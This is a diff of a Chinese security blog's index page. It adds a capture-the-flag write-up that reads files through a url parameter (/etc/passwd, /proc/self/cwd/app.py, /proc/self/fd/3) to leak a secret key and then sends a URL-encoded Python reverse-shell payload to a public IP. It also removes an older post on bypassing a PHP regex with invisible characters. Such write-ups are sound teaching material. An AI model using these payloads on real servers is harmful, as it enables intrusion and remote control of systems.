@@ -169,6 +169,106 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-反弹shell以及proc虚拟文件系统" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/30/%E5%8F%8D%E5%BC%B9shell%E4%BB%A5%E5%8F%8Aproc%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" class="article-date">
+  	<time datetime="2021-09-29T16:00:00.000Z" itemprop="datePublished">2021-09-30</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/30/%E5%8F%8D%E5%BC%B9shell%E4%BB%A5%E5%8F%8Aproc%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">
+        反弹shell以及proc虚拟文件系统
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="反弹shell以及proc虚拟文件系统"><a href="#反弹shell以及proc虚拟文件系统" class="headerlink" title="反弹shell以及proc虚拟文件系统"></a>反弹shell以及proc虚拟文件系统</h1><p>打开页面，发现是一个输入框，所以随便输入一些东西进去，发现有一个get提交的url参数，我们试着构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<p>发现可以读取信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">app:x:1000:1000::/home/app:/bin/sh</span><br></pre></td></tr></table></figure>
+<p>所以我们可以尝试读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=../../../../../flag</span><br></pre></td></tr></table></figure>
+<p>发现可以读取flag</p>
+<p>当然了，如果flag不在这个目录下怎么办呢？我们可以尝试利用proc系统</p>
+<h2 id="Linuc下的proc-pid-信息说明"><a href="#Linuc下的proc-pid-信息说明" class="headerlink" title="Linuc下的proc/pid/信息说明"></a>Linuc下的proc/pid/信息说明</h2><p>proc是一个虚拟文件系统，它挂载于Linux系统中的/proc目录之上，它有多个功能，其中一个重要的功能是用户可以通过它访问内核信息或排错</p>
+<h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><p>在/proc文件系统中，每个进程都有一个相应的文件，以下是/proc目录下的一些重要文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/proc/pid/cmdline：包含了用于开始进程的命令</span><br><span class="line"></span><br><span class="line">/proc/pid/cwd：包含了当前进程工作目录的一个链接</span><br><span class="line"></span><br><span class="line">/proc/pid/environ：包含了可用进程环境变量的列表</span><br><span class="line"></span><br><span class="line">/proc/pid/exe：包含了正在进程中运行的程序链接</span><br><span class="line"></span><br><span class="line">/proc/pid/fd/：这个目录包含了进程打开的每一个文件的链接</span><br><span class="line"></span><br><span class="line">/proc/pid/mem：包含了进程在内存中的内容</span><br><span class="line"></span><br><span class="line">/proc/pid/stat：包含了进程的状态信息</span><br><span class="line"></span><br><span class="line">/proc/pid/statm：包含了进程的内存使用信息</span><br></pre></td></tr></table></figure>
+<p>其中的pid一般是端口号或者是self，可以在本地ubuntu使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /proc/</span><br></pre></td></tr></table></figure>
+<p>来查看里面的信息</p>
+<h3 id="proc目录的大致介绍"><a href="#proc目录的大致介绍" class="headerlink" title="/proc目录的大致介绍"></a>/proc目录的大致介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 【number】：在/proc目录下，每个正在运行的进程都有一个以该进程ID命名的子目录</span><br><span class="line"></span><br><span class="line">2. 【number】/cmdline：该文件保存了进程的完整命令，如果该进程已经被交换出内存或僵死，则该文件为空</span><br><span class="line"></span><br><span class="line">3. 【number】/cwd：一个符号连接，指向进程当前工作目录</span><br><span class="line"></span><br><span class="line">4. 【number】/environ：该环境保存进程的环境变量，各项之间以空字符作为间隔，结尾也可能是一个空字符，可以使用echo /proc/1/environ来查看1进程的环境变量</span><br><span class="line"></span><br><span class="line">5. 【number】/exe：是一个符号连接，指向被执行的二进制代码，在Linux2.0或更加版本的下，对exe特殊文件的readlink(2)返回一个如下格式的字符串：[设备号]:节点号</span><br><span class="line"> 6. 【number】/fd：进程所打开的每个文件都有一个符号连接在该子目录下，以文件描述符命名，这个名字实际上是指向真正的文件符号连接</span><br></pre></td></tr></table></figure>
+<p>[/proc虚拟文件系统的详细说明][<a target="_blank" rel="noopener" href="https://blog.csdn.net/shenhuxi_yu/article/details/79697792]">https://blog.csdn.net/shenhuxi_yu/article/details/79697792]</a></p>
+<p>所以回到题目本身，我们可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/cmdline</span><br></pre></td></tr></table></figure>
+<p>来查看开始进程命令为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 app.py</span><br></pre></td></tr></table></figure>
+<p>所以我们可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/cwd/app.py</span><br></pre></td></tr></table></figure>
+<p>来读取app.py文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, Response</span><br><span class="line">from flask import render_template</span><br><span class="line">from flask import request</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = &quot;/tmp/secret.txt&quot;</span><br><span class="line">f = open(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;search.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/page&#x27;)</span><br><span class="line">def page():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    try:</span><br><span class="line">        if not url.lower().startswith(&quot;file&quot;):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=&#x27;application/octet-stream&#x27;)</span><br><span class="line">            response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27;</span><br><span class="line">            return response</span><br><span class="line">        else:</span><br><span class="line">            value = &quot;HACK ERROR!&quot;</span><br><span class="line">    except:</span><br><span class="line">        value = &quot;SOMETHING WRONG!&quot;</span><br><span class="line">    return render_template(&#x27;search.html&#x27;, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span><br><span class="line">def manager():</span><br><span class="line">    key = request.args.get(&quot;key&quot;)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    if key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(&quot;shell&quot;)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = &quot;ok&quot;</span><br><span class="line">    else:</span><br><span class="line">        res = &quot;Wrong Key!&quot;</span><br><span class="line"></span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>通过这串代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = request.args.get(&quot;key&quot;)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    if key == SECRET_KEY:</span><br></pre></td></tr></table></figure>
+<p>可知，我们需要知道key是什么，所以我们可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/fd/[number]</span><br></pre></td></tr></table></figure>
+<p>命令来读取进程打开的每一个文件，其中通过测试number为3，即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/fd/3</span><br></pre></td></tr></table></figure>
+<p>发现key，然后经过url编码为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C7ueFsNl0ianR6uxTgIqepkLxQDSp0OE5pyPl51XA%2F4%3D</span><br></pre></td></tr></table></figure>
+<p>然后通过这串代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os.system(shell)</span><br><span class="line">       res = &quot;ok&quot;</span><br><span class="line">   else:</span><br><span class="line">       res = &quot;Wrong Key!&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可知，我们可以构造shell参数，来使用反弹shell，由于系统是python文件，所以我们需要一个python写的反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.***.***.***&quot;,39555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>其中ip部分写自己的服务器的公网ip，端口可以写7777，然后在服务器的命令行可以输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
+<p>来监控7777端口，接受反弹shell，但是我的阿里云的服务器用不了，很气人，推荐腾讯云，所以我们可以构造payload，其中shell参数的值需要url编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=C7ueFsNl0ianR6uxTgIqepkLxQDSp0OE5pyPl51XA%2F4%3D&amp;shell=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2247.242.68.88%22%2C7777))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27</span><br></pre></td></tr></table></figure>
+<p>然后就可以获得shell了</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-koa框架以及JWT利用" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1162,90 +1262,6 @@ echo serialize($obj);
 
     [https://mp.weixin.qq.com/s?__biz=MzAxNzkyOTgxMw==&amp;mid=2247487259&amp;idx=1&amp;sn=e70d97877c0f1a282cf56c6ad4e34d26&amp;chksm=9bdf4c21aca8c5372350a6fa309720a07542d74f61f537229f93927eec6ff5828d9794408571&amp;exptype=unsubscribed_card_3_article_onlinev2_1000w_promotion_level2&amp;expsessionid=2055871802941276160&amp;scene=169&amp;subscene=10000&amp;sessionid=1632156171&amp;clicktime=1632156172&amp;enterid=1632156172&amp;ascene=56&amp;devicetype=android-30&amp;version=28000b59&amp;nettype=cmnet&amp;abtest_cookie=AAACAA%3D%3D&amp;lang=zh_CN&amp;exportkey=A8U60hrCswzBIw4qx3LcHl4%3D&amp;pass_ticket=wgImpgfwefCQmznd1rg85X51CdNokjWKgG%2B1%2FN7vSYdFBa8eTAvqvC25RW7jJ3SP&amp;wx_header=1]
 </code></pre>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-不可见字符绕过" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/20/%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/" class="article-date">
-  	<time datetime="2021-09-19T16:00:00.000Z" itemprop="datePublished">2021-09-20</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/20/%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/">
-        不可见字符绕过
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="不可见字符绕过"><a href="#不可见字符绕过" class="headerlink" title="不可见字符绕过"></a>不可见字符绕过</h1><p>打开页面后，点击source，发现源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>我们看见这个提示</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br></pre></td></tr></table></figure>
-<p>可知，flag在config.php文件中，然后我们看见这一串加密代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>发现只要我们可以绕过这个if</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (hash_equals($secret, $guess))</span><br></pre></td></tr></table></figure>
-<p>就可以读取flag，但是由于random_bytes(64)是生成加密使用的64长度的加密随机字节字符串，而hash_equals()是匹配两个字符串是否相同，所以发现这个点不可以，但是我们仔细观看preg_match()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])</span><br></pre></td></tr></table></figure>
-<p>$_SERVER[‘PHP_SELF’]<br>作用是表示php文件相对于网站根目录的位置地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">实例：http://url/php/index.php                 /php/index.php</span><br><span class="line"></span><br><span class="line">           http://url/php/index.php?test=foo                   /php/index.php</span><br><span class="line"></span><br><span class="line">           http://url/php/index.php/test/foo                    /php/index.php/test/foo</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>而源码中的正则过滤是如果目录路径是以config.php/结尾的话，则会触发过滤，然后我们再看这串代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br></pre></td></tr></table></figure>
-
-<p>basename()<br>作用是返回路径中文件名部分</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$str1=&quot;/index.php/config.php/&quot;;</span><br><span class="line"></span><br><span class="line">echo basename($str1).&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$str2=&quot;/index.php/config.php&quot;;</span><br><span class="line"></span><br><span class="line">echo  basename($str2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>所以我们可以使用highlight_file()这个函数和basename()这个函数来读取config.php文件，又因为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;source&#x27;]))</span><br></pre></td></tr></table></figure>
-<p>要经过上面的if才可以执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br></pre></td></tr></table></figure>
-<p>而source参数在index.php文件中，所以在我们构造payload时需要在config.php前加index.php，因为浏览器此时只会解析index.php文件，然后我们需要构造不可见字符在config.php/后面作为结尾，从而绕过正则过滤，而这些不可见字符在baseneme()函数中会被去除掉，所以写了个脚本来获取特殊字符</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function check($str)&#123;</span><br><span class="line">	return preg_match(&#x27;/config\.php\/*$/i&#x27;,$str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;255;$i++)&#123;</span><br><span class="line">	$s=&#x27;/index.php/config.php/&#x27;.chr($i);</span><br><span class="line">	if(!check($s))&#123;</span><br><span class="line">		$t=basename(&#x27;/index.php/config.php/&#x27;.chr($i));</span><br><span class="line">		echo &quot;$&#123;i&#125;:$&#123;t&#125;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>将不可见字符的ascii码化为16进制，并在前面加%即可使用，所以我们可以构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%80?source</span><br></pre></td></tr></table></figure>
-<p>就可以读取config.php文件</p>
 
       
     </div>
